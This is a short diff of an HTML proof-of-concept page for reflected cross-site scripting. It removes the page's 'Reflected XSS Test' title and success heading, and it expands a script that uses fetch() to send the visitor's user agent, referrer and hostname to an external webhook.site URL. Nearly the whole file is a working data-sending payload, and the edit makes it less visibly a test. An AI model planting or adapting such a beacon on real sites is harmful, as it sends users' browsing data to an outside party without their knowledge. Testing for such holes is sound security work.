@@ -1,12 +1,11 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Reflected XSS Test</title>
-</head>
 <body>
-<h1>PoC loaded successfully</h1>
 <script>
-  fetch("https://webhook.site/e7e51d1c-b882-4d14-b4db-ba745f8a2525?proof=executed&origin=" + encodeURIComponent(document.location.origin));
+fetch("https://webhook.site/e7e51d1c-b882-4d14-b4db-ba745f8a2525?proof=executed" +
+  "&ua=" + encodeURIComponent(navigator.userAgent) +
+  "&ref=" + encodeURIComponent(document.referrer) +
+  "&loc=" + encodeURIComponent(location.hostname));
 </script>
 </body>
 </html>
